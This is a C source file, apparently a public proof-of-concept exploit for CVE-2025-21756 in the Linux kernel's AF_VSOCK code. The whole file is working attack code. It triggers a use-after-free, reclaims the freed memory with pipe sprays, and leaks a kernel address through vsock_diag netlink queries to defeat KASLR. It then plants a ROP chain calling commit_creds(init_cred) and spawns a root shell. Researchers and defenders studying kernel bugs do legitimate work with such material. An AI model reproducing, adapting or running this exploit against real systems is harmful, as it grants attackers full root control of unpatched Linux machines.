#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/kernel.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sched.h>
#include <linux/vm_sockets.h>
#include <assert.h>
#include <sys/msg.h>
#include <linux/netlink.h>
#include <linux/vm_sockets_diag.h>
#include <linux/sock_diag.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>

/*
    CVE-2025-21756 Exploit
    Michael Hoefler
    4/18/2025
*/

#define MAX_PORT_RETRIES	24	/* net/vmw_vsock/af_vsock.c */
#define VMADDR_CID_NONEXISTING	42

// PINGv6 
#define OBJS_PER_SLAB 12
#define CPU_PARTIAL 24
#define FLUSH ((OBJS_PER_SLAB) * (CPU_PARTIAL + 1))
#define PRE (OBJS_PER_SLAB - 1) * 10
#define POST (OBJS_PER_SLAB + 1) * 10

#define SIZE 1280
#define SPRAY_SIZE 1200
#define NUM_PIPES 500

#define BUFFER_SIZE 8192

#define PAGE_SIZE 4096

/* Create socket <type>, bind to <cid, port> and return the file descriptor. */
int vsock_bind(unsigned int cid, unsigned int port, int type)
{
	struct sockaddr_vm sa = {
		.svm_family = AF_VSOCK,
		.svm_cid = cid,
		.svm_port = port,
	};
	int fd;

	fd = socket(AF_VSOCK, type, 0);
	if (fd < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa))) {
		perror("bind");
		exit(EXIT_FAILURE);
	}

	return fd;
}

// get a shell
void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

long get_user_rsp() {
    long rsp;
    __asm__ volatile("mov %%rsp, %0" : "=r"(rsp));
    return rsp;
}

int query_vsock_diag() {
    int sock;
    struct sockaddr_nl sa;
    struct nlmsghdr *nlh;
    struct vsock_diag_req req;
    char buffer[BUFFER_SIZE];

    // Create Netlink socket
    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG);
    if (sock < 0) {
        perror("socket");
        exit(-1);
    }

    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;

    // Prepare Netlink message
    memset(&req, 0, sizeof(req));
    req.sdiag_family = AF_VSOCK;
    req.vdiag_states = (1 << 2);

    nlh = (struct nlmsghdr *)buffer;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(req));
    nlh->nlmsg_type = SOCK_DIAG_BY_FAMILY;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
    nlh->nlmsg_seq = 1;
    nlh->nlmsg_pid = getpid();
    
    memcpy(NLMSG_DATA(nlh), &req, sizeof(req));

    // Send request
    //printf("sock: %d\n", sock);
    if (sendto(sock, nlh, nlh->nlmsg_len, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("ERROR: sendto");
        close(sock);
        exit(-1);
    }

    // Receive response
    ssize_t len = recv(sock, buffer, sizeof(buffer), 0);
    if (len < 0) {
        perror("ERROR: recv");
        close(sock);
        exit(-1);
    }

    close(sock);
    return len;
}

void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) == -1) {
        perror("sched_setaffinity");
        exit(1);
    }
}

int main(void) {

	int sockets[MAX_PORT_RETRIES];
	struct sockaddr_vm addr;
	int s, i, alen;

    printf(
"                       _                        \n"
"                      | |                       \n"
" __   _____  ___   ___| | ___ ____      ___ __  \n"
" \\ \\ / / __|/ _ \\ / __| |/ / '_ \\ \\ /\\ / / '_ \\ \n"
"  \\ V /\\__ \\ (_) | (__|   <| |_) \\ V  V /| | | |\n"
"   \\_/ |___/\\___/ \\___|_|\\_\\ .__/ \\_/\\_/ |_| |_|\n"
"                           | |                  \n"
"                           |_|                  \n");

    puts("[+] pinning to cpu0");
    pin_cpu(0);

    puts("[+] alloc enough sockets and prepare bind table");

    int junk[FLUSH];
    for (int i = 0; i < FLUSH; i++)
        junk[i] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

	s = vsock_bind(VMADDR_CID_LOCAL, VMADDR_PORT_ANY, SOCK_SEQPACKET);

	alen = sizeof(addr);
	if (getsockname(s, (struct sockaddr *)&addr, &alen)) {
		perror("getsockname");
		exit(EXIT_FAILURE);
	}

    struct sockaddr_vm sa = {
       .svm_family = AF_VSOCK,
       .svm_cid = VMADDR_CID_LOCAL,
       .svm_port = addr.svm_port,
    };

	for (i = 0; i < MAX_PORT_RETRIES; ++i) {
        sa.svm_port = ++addr.svm_port;
	    if (bind(junk[i], (struct sockaddr *)&sa, sizeof(sa))) {
	    	perror("bind");
	    	exit(EXIT_FAILURE);
	    }
    }

	close(s);

    puts("[+] pre alloc sockets");

    int pre[PRE];
    for (int i = 0; i < PRE; i++)
	    pre[i] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

    puts("[+] alloc target");
	s = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (s < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

    // testing
    puts("[+] post-alloc objects");
    int post[POST];
    for (int i = 0; i < POST; i++)
        post[i] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
    
    
    puts("[+] trigger uaf");
	if (!connect(s, (struct sockaddr *)&addr, alen)) {
		fprintf(stderr, "Unexpected connect() #1 success\n");
		exit(EXIT_FAILURE);
	}
	// connect() #1 failed: transport set, sk in unbound list.

	addr.svm_cid = VMADDR_CID_NONEXISTING;
    addr.svm_port = VMADDR_PORT_ANY;
	if (!connect(s, (struct sockaddr *)&addr, alen)) {
		fprintf(stderr, "Unexpected connect() #2 success\n");
		exit(EXIT_FAILURE);
	}
	// connect() #2 failed: transport unset, sk ref dropped?

    // wait for input
    puts("[+] uaf finished!..");


    puts("[+] fill up the cpu partial list");
    for (int i = 4; i < FLUSH; i += OBJS_PER_SLAB)
        close(junk[i]);

    puts("[+] free all the pre/post alloc-ed objects");
    for (int i = 0; i < POST; i++)
        close(post[i]);
    for (int i = 0; i < PRE; i++)
        close(pre[i]);

    puts("[+] close the junk bound sockets");
    for (int i = 0; i < FLUSH; i++)
	    close(junk[i]);

    sleep(3);

    int pipes[NUM_PIPES][2];
    char page[PAGE_SIZE];
    memset(page, 2, PAGE_SIZE);

    puts("[+] reclaim page");

    int w = 0;
    int j;
    i = 0;
    while (1) { // TODO: i < NUM_PIPES, improve stability

        sleep(0.1);

        if (pipe(&pipes[i][0]) < 0) {
            perror("pipe");
            break;
        }

        printf(".");
        fflush(stdout);


        w = 0;
        while (w < PAGE_SIZE) {
            ssize_t written = write(pipes[i][1], page, 8);
            j = query_vsock_diag();
            w += written;
            if (j != 48) goto out;
        }
        i++;
        if (i % 32 == 0) puts("");
    }

out:

    printf("\n[+] found init_net at i=%d and w=%d\n", i, w);

    //getchar();

    long base = 0xffffffff84bb0000; // probably need to change for aslr
    long off = 0;
    long addy;
    printf("[+] attempting net overwrite (aslr bypass).\n");

    while (off < 0xffffffff) {


        close(pipes[i][0]);
        close(pipes[i][1]);

        if (pipe(&pipes[i][0]) < 0) {
            perror("pipe");
        }

        addy = base + off;

        write(pipes[i][1], page, w - 8);
        write(pipes[i][1], &addy, 8);

        if (off % 256 == 0) {
            printf("+");
            fflush(stdout);
        }

        j = query_vsock_diag();
        if (j == 48) {
            printf("\n[*] LEAK init_net @ 0x%lx\n", base + off);
            goto out2;
        }

        off += 128; // TODO: modify for aslr?

    }

out2:

    long kern_base = base + off - 0x3bb1f80;
    printf("[*] leaked kernel base @ 0x%lx\n", kern_base);

    // calculate some rop gadgets
    long raw_proto_abort = kern_base + 0x2efa8c0;
    long null_ptr = kern_base + 0x2eeaee0;
    long init_cred = kern_base + 0x2c74d80;
    long pop_r15_ret = kern_base + 0x15e93f;
    long push_rbx_pop_rsp_ret = kern_base + 0x6b9529;
    long pop_rdi_ret = kern_base + 0x15e940;
    long commit_creds = kern_base + 0x1fcc40;
    long ret = kern_base + 0x5d2;

    // info for returning to usermode
    long user_cs = 0x33;
    long user_ss = 0x2b;
    long user_rflags = 0x202;
    long shell = (long)get_shell;

    uint64_t* user_rsp = (uint64_t*)get_user_rsp();

    // return to user mode
    long swapgs_restore_regs_and_return_to_usermode = kern_base + 0x16011a6;

    //getchar();

    printf("[+] writing the rop chain\n");

    close(pipes[i][0]);
    close(pipes[i][1]);

    if (pipe(&pipes[i][0]) < 0) {
        perror("pipe");
    }

    printf("[+] writing payload to vsk\n");
    write(pipes[i][1], page, w - 56);

    char buf[0x330];
    memset(buf, 'A', 0x330);
    char not[0x330];
    memset(not, 0, 0x330);

    // create the rop chain!
    write(pipes[i][1], &pop_rdi_ret, 8); // stack pivot target
    write(pipes[i][1], &init_cred, 8);
    write(pipes[i][1], &ret, 8); 
    write(pipes[i][1], &ret, 8);
    write(pipes[i][1], &pop_r15_ret, 8); // junk
    write(pipes[i][1], &raw_proto_abort, 8); // sk_prot (calls sk->sk_error_report())
    write(pipes[i][1], &ret, 8);
    write(pipes[i][1], &commit_creds, 8); // commit_creds(init_cred);
    write(pipes[i][1], &swapgs_restore_regs_and_return_to_usermode, 8);
    write(pipes[i][1], &null_ptr, 8); // rax
    write(pipes[i][1], &null_ptr, 8); // rdi
    write(pipes[i][1], &shell, 8); // rip
    write(pipes[i][1], &user_cs, 8);
    write(pipes[i][1], &user_rflags, 8);
    write(pipes[i][1], user_rsp, 8); // rsp
    write(pipes[i][1], &user_ss, 8);
    write(pipes[i][1], buf, 0x18);
    write(pipes[i][1], &not, 8); // sk_lock
    write(pipes[i][1], &not, 8); // sk_lock
    write(pipes[i][1], &null_ptr, 8); // sk_lock
    write(pipes[i][1], &null_ptr, 8); // sk_lock
    write(pipes[i][1], buf, 0x200);
    write(pipes[i][1], &push_rbx_pop_rsp_ret, 8); // stack pivot [sk_error_report()]

    //getchar();

    close(s); // trigger the exploit!

}

